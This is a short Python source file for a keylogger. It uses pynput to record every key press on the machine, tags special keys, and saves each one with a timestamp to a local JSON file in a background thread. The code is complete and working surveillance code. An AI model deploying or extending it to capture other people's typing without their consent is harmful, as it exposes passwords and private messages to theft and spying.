from pynput.keyboard import Listener
from datetime import datetime
import threading
from data_storage import DataStorage

class PhysicalKeyLogger:
    def __init__(self, output_path="keylogs.json"):
        self.output_path = output_path
        self.data_storage = DataStorage(output_path)  # Initialize DataStorage instance

    def on_press(self, key):
        try:
            key_name = key.char
        except AttributeError:
            key_name = str(key)

        if key_name == "Key.space":
            key_name = " "
        elif key_name == "Key.enter":
            key_name = "[ENTER]"
        elif key_name == "Key.backspace":
            key_name = "[BACKSPACE]"
        elif "Key." in key_name:
            key_name = f"[{key_name.replace('Key.', '').upper()}]"

        # Prepare the data to be saved (No source field)
        key_event = {
            "key": key_name,
            "timestamp": str(datetime.now())
        }

        # Save the data using DataStorage
        self.data_storage.append_keystroke(key_event)

    def start_physical_listener(self):
        """Start listening for physical keyboard input."""
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def run_physical_listener(self):
        """Start physical keyboard listener in a separate thread."""
        t = threading.Thread(target=self.start_physical_listener)
        t.daemon = True
        t.start()

if __name__ == "__main__":
    logger = PhysicalKeyLogger()
    logger.run_physical_listener()

    while True:
        pass  # Keeps the program running for testing purposes
